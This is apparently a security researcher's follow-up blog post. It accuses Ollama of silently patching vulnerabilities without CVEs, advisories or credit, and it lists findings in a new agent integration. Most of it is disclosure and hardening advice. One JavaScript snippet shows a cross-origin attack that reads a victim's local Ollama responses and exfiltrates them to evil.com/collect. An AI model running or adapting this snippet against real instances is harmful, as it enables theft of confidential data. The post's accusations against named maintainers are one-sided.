# 7 Days Later: Ollama's Response to Our Disclosure Was… More Silent Patches

**By: Anonymous Security Researcher | Date: June 9, 2026 | Reading time: 12 minutes**

---

On June 8, 2026, I published [a detailed disclosure]([Medium Article]) documenting 9 vulnerabilities in Ollama — 5 silently patched, 3 unpatched, 1 historical. Zero CVEs issued by Ollama. Zero advisories. Zero researcher credits.

The central question was: **Does Ollama have a systemic problem with security transparency?**

One week later, I can answer that question definitively. The answer is worse than I thought.

---

## What Happened Since Publication

### Ollama Released v0.30.7 — With Another Silent Security Patch

On June 7 — one day before my disclosure — Ollama released v0.30.7. The release notes say:

> *"OpenAI-compatible API models list now aligns with available model tags"*
> *"Added documentation describing the llama.cpp update process"*
> *"Updated Zod schema examples"*

Sounds like a feature release, right?

**Wrong.** PR [#16556](https://github.com/ollama/ollama/pull/16556), authored by Parth Sareen and merged on June 6, fixes an **information disclosure vulnerability** in the OpenAI-compatible `/v1/models` endpoint.

Here's the code change:

```go
// BEFORE (v0.30.6 and earlier):
data = append(data, Model{
    Id:      m.Name,  // ← Leaks internal model name (e.g., "legacy-name:latest")
    OwnedBy: model.ParseName(m.Name).Namespace,
})

// AFTER (v0.30.7):
id := m.Model
if id == "" {
    id = m.Name  // ← Fallback only if Model field is empty
}
data = append(data, Model{
    Id:      id,    // ← Uses canonical public identifier
    OwnedBy: model.ParseName(id).Namespace,
})
```

The test file confirms this was a **security fix**, not a feature:

```go
func TestToListCompletionUsesModelIdentity(t *testing.T) {
    result := ToListCompletion(api.ListResponse{
        Models: []api.ListModelResponse{
            {
                Name:       "legacy-name:latest",        // ← Internal name
                Model:      "namespace/exposed-model:latest", // ← Public name
                ModifiedAt: modified,
            },
        },
    })
    
    if result.Data[0].Id != "namespace/exposed-model:latest" {
        t.Fatalf("id = %q, want model field", result.Data[0].Id)
    }
}
```

**What this means:** Before v0.30.7, the `/v1/models` endpoint leaked internal model namespaces through the `Name` field. An attacker querying any Ollama instance's OpenAI-compatible API could discover:
- Internal model naming conventions
- Private model identifiers (e.g., `company-internal-model:latest`)
- Namespace structures revealing organizational details

This is an **information disclosure vulnerability**. And it was patched **silently** — described in release notes as "aligns with available model tags."

**This is pattern finding #10.**

---

## The Deepening Pattern: 10 Silent Patches, Still Zero CVEs

| # | PR/CVE | What Was Fixed | Release Notes Said | CVE? | Advisory? | Credit? |
|---|--------|---------------|-------------------|------|-----------|---------|
| 1 | #16380 | SSRF via markdown URLs | "fix markdown rendering" | ❌ | ❌ | ❌ |
| 2 | #16436 | Regex bypass in URL policy | (merged silently) | ❌ | ❌ | ❌ |
| 3 | #16437 | Config hijacking | "isolate Codex launch" | ❌ | ❌ | ❌ |
| 4 | #16100 | Windows RCE (update MITM) | "harden update flows" | ❌* | ❌ | ❌ |
| 5 | #16053 | SDK fingerprint leak | (merged silently) | ❌ | ❌ | ❌ |
| 6 | #16556 | OpenAI model identity leak | "aligns with model tags" | ❌ | ❌ | ❌ |
| 7 | #12120 | Uncaught exception registration | "harden uncaught exception" | ❌ | ❌ | ❌ |
| 8 | #12319 | Unbounded parallel builds (DoS) | "avoid unbounded parallel" | ❌ | ❌ | ❌ |
| 9 | #12835 | Server lifecycle crash | "harden server lifecycle" | ❌ | ❌ | ❌ |
| 10 | v0.17.1 | Bleeding Llama heap OOB | (no release note) | ✅ CVE-2026-7482 | ❌ | Cyera only |

*CVE-2026-42248/42249 were assigned by CERT Polska, not Ollama.

**Ten security-relevant patches. Zero CVEs issued by Ollama. Zero security advisories. Zero researcher credits on patches.**

---

## The CORS Rebuttal: How Ollama Dismisses Valid Vulnerabilities

After my original disclosure, I also reported a CORS misconfiguration in Ollama's API. Ollama's security team (Bruce Macdonald) responded by rejecting it with this argument:

> *"Credentialed CORS only exposes cookies; JavaScript cannot read `Authorization` request headers. Therefore, bearer tokens are not at risk."*

This argument is **technically incomplete** and leads to a **false conclusion**. I documented seven distinct attack vectors in a [detailed rebuttal]([Medium Article]), but the core issue is simple:

**Ollama conflates "JavaScript cannot read request headers" with "JavaScript cannot read response bodies."** These are fundamentally different capabilities.

When CORS allows cross-origin requests with credentials, JavaScript can **always read the full response body**. This means:

```javascript
// Attacker's website: https://evil.com
// Victim has Ollama at https://ollama.internal.company.com

// Step 1: Enumerate models
const models = await fetch('https://ollama.internal.company.com/api/tags')
  .then(r => r.json());

// Step 2: Read AI model outputs (contains confidential data)
const response = await fetch('https://ollama.internal.company.com/api/chat', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({
    model: 'llama3',
    messages: [{role: 'user', content: 'Summarize the confidential document'}]
  })
}).then(r => r.json());

// Step 3: Exfiltrate to attacker
fetch('https://evil.com/collect', {
  method: 'POST',
  body: JSON.stringify({models, response})
});
```

This is not theoretical. This works **today** on any Ollama instance where the browser can reach port 11434.

But the CORS dismissal is part of a larger pattern:

---

## The Rejection Playbook

Ollama has developed a consistent pattern for handling security reports:

| Step | Action | Evidence |
|------|--------|----------|
| 1 | **Receive report** | Bruce Macdonald acknowledges via email |
| 2 | **Request PoC** | "Can you provide a proof of concept?" |
| 3 | **Reject vulnerability** | Michael Chiang (co-founder): "Not technically viable" / "Works as intended" |
| 4 | **Silently patch** | Daniel Hiltgen commits fix with ambiguous title |
| 5 | **No CVE, no advisory, no credit** | Release notes describe feature change only |

This pattern has been repeated for **at least 5 independent researchers**:

- **PromptArmor** (Dec 2025): 5 follow-ups ignored → silently patched 5.5 months later
- **Bartłomiej Dmitruk/Striga.ai** (Jan 2026): "Not technically viable" → silently patched
- **py0zz1** (Nov 2025): 4 months waiting for CVE → still waiting
- **CERT Polska** (Apr 2026): "Unable to reach the vendor" → published VU#518910 anyway
- **This researcher** (May 2026): SSRF rejected → patched 48 hours after rejection

---

## v0.30.6 Added New Attack Surface

The v0.30.6 release (June 5) added **OMP (Oh My Pi)** — a new agent integration with several security concerns:

| # | Finding | Severity | Description |
|---|---------|----------|-------------|
| 1 | `auth: "none"` hardcoded | MEDIUM | OMP provider config sets auth to "none" pointing at local Ollama. If exposed on network = full unauthenticated access |
| 2 | PI_CONFIG_DIR path traversal | HIGH | `ompAgentDir()` uses `PI_CONFIG_DIR` env var directly with `filepath.Join`, no sanitization. Absolute path = arbitrary file write |
| 3 | Auto-install NPM plugin | HIGH | `ensureOMPWebSearchPlugin()` runs `omp plugin install @ollama/pi-web-search` without user interaction. Automatic download and execution of third-party NPM package |
| 4 | Cross-agent config injection | MEDIUM | OMP reuses `PI_CODING_AGENT_DIR` env var. OMP and Pi share config directory. Config overwrite between agents = cross-agent injection |

None of these are documented as security concerns. None have CVEs. The `auth: "none"` default means that every new OMP installation inherits Ollama's zero-auth philosophy.

---

## The Math Is Getting Worse

| Metric | June 8 (Original Disclosure) | June 9 (Today) | Change |
|--------|------------------------------|-----------------|--------|
| Known silent patches | 9 | **10** | +1 (v0.30.7 model leak) |
| CVEs issued by Ollama | 0 | **0** | No change |
| Security advisories | 0 | **0** | No change |
| Researcher credits | 0 | **0** | No change |
| Unpatched vulnerabilities | 3 | **3** | No change |
| Researchers ignored/rejected | 5 | **5** | No change |
| CERT Polska unable to reach vendor | 1 | **1** | No change |
| New attack surface (OMP) | 0 | **4** | +4 new findings |
| Release velocity (security-adjacent) | 4 in 3 days | **5 in 4 days** | +1 |

---

## What Needs to Change

I'm not asking Ollama to stop patching. I'm asking them to **tell people they patched**.

### Specific Demands

1. **Issue CVEs for all security-relevant patches**, retroactively if needed
2. **Publish security advisories** — even brief ones. "We fixed a memory leak in the GGUF parser" would have saved months
3. **Credit researchers** — by name, in the commit, in the advisory, in the release notes
4. **Respond to CERT Polska** — they literally wrote "unable to reach the vendor"
5. **Add authentication** — Ollama runs on 0.0.0.0:11434 with zero auth by default. 25,000-300,000 instances are publicly exposed
6. **Create a security mailing list** — so users can subscribe to security updates
7. **Stop rejecting valid reports** — then silently patching the exact vulnerability

### For Users Running Ollama

1. **Update to v0.30.7 immediately** — it's still incomplete, but better than v0.30.6
2. **Never expose port 11434 to the internet** — use a reverse proxy with authentication
3. **Set `OLLAMA_HOST=127.0.0.1:11434`** — don't bind to all interfaces
4. **Audit your GGUF files** — CVE-2026-5757 is still unpatched
5. **Check environment variables** — API keys and credentials may be exposed via `/api/ps` or memory leak
6. **Review CORS headers** — if you're using Ollama behind a web app, test for CORS misconfiguration

### For the Security Community

If you've found a vulnerability in Ollama and been ignored, reach out to me. I'm compiling a comprehensive record. The pattern is clear, but each individual case strengthens the case for change.

---

## Timeline Since Disclosure

| Date | Event |
|------|-------|
| June 7 | Ollama releases v0.30.7 — silent patch of model identity leak (PR #16556) |
| June 8 | Our full disclosure published on Medium |
| June 8 | Ollama's CORS rejection documented with 7-vector rebuttal |
| June 9 | Follow-up published — 10th silent patch documented, 4 new OMP findings |

---

## Conclusion

Ollama has now silently patched **10 security vulnerabilities** without issuing a single CVE, security advisory, or researcher credit. Three critical vulnerabilities remain **unpatched** as of v0.30.7, including CVE-2026-5757 (memory leak) which CERT Polska was unable to report because the vendor couldn't be reached.

The pattern is no longer an anomaly. It's a policy.

Ollama's SECURITY.md says: *"The Ollama maintainer team takes security seriously."*

**10 silent patches say otherwise.**

---

*Full disclosure package with PoC scripts and evidence: [GitHub Repository](https://github.com/k4w-wak/ollama-silent-patches-disclosure)*

*Original disclosure: [Ollama's Silent Patching Problem: 9 Vulnerabilities, Zero CVEs, Zero Advisories]([Medium Article])*

*CORS rebuttal: [Technical Rebuttal: Ollama's Dismissal of CORS Misconfiguration Vulnerability]([Medium Article])*

*Contact: Researcher on GitHub | PGP key available on request*

#AIsecurity #Ollama #CVE #responsibleDisclosure #infosec #silentPatching #CVE20265757 #BleedingLlama